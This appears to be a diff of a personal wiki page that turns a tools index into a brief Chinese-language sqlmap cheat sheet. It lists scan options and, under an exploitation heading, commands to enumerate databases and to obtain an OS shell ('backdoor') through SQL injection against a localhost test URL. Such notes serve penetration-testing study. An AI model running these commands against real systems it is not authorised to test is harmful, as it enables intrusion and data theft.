@@ -22,7 +22,7 @@ if (!doNotTrack) {
 
 
 
-<title>Tools | r809&#39;s Notes</title>
+<title>Sqlmap | r809&#39;s Notes</title>
 
 <script type="text/javascript" async
   src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML">
@@ -47,19 +47,56 @@ if (!doNotTrack) {
     </a>
     
 </nav>
-<div id="main">    <h1 class="website-name" id="website-name"><a href="https://r888800009.github.io/" class="website-name">Tools</a></h1>
-<div id="content">
-    <h1><a href="https://r888800009.github.io/wiki/git/" class="post-link">Git</a></h1>
+<div id="main">    <h1 class="website-name" id="website-name"><a href="https://r888800009.github.io/" class="website-name">Sqlmap</a></h1>
+<div id="content"><div class="date"> 
+        <time datetime="2019-08-20 12:51:25 &#43;0800 CST">Tue, 2019 Aug 20</time>
+    </div> 
+    <h2 id="掃描指令">掃描指令</h2>
 
-    <h1><a href="https://r888800009.github.io/wiki/sqlmap/" class="post-link">Sqlmap</a></h1>
+<ul>
+<li><code>--output-dir=</code>: 輸出位置</li>
+<li><code>-u url</code></li>
+<li><code>--method POST</code></li>
+<li><code>-p &quot;content,title&quot;</code></li>
+<li><code>--data &quot;title=a&amp;content=b&quot;</code></li>
+<li><code>--user-agent=</code></li>
+</ul>
 
+<p>提昇風險注入</p>
 
-<div style="font-size: 200%; text-align: center; font-weight: bold;">
+<pre><code class="language-plaintext">--level=3 --risk=3
+</code></pre>
+
+<p>設定cookie</p>
+
+<pre><code class="language-plaintext">--cookie='PHPSESSID=XXXX'
+</code></pre>
+
+<p>指定DBMS</p>
+
+<pre><code class="language-plaintext">--dbms MySQL
+</code></pre>
+
+<h2 id="利用">利用</h2>
+
+<p>獲取資料表</p>
+
+<pre><code class="language-bash">sqlmap -u 'https://localhost/sql-inj.php?inj=1' -dbs
+</code></pre>
+
+<p>值入後門</p>
+
+<pre><code class="language-bash">sqlmap -u 'https://localhost/sql-inj.php?inj=1' --os-shell
+</code></pre>
+
     
-
+      <hr>
+      
+        <a href="https://r888800009.github.io/tags/sql" class="tags">SQL</a>
+      
+        <a href="https://r888800009.github.io/tags/tools" class="tags">Tools</a>
+      
     
-</div>
-
 
 
             </div>
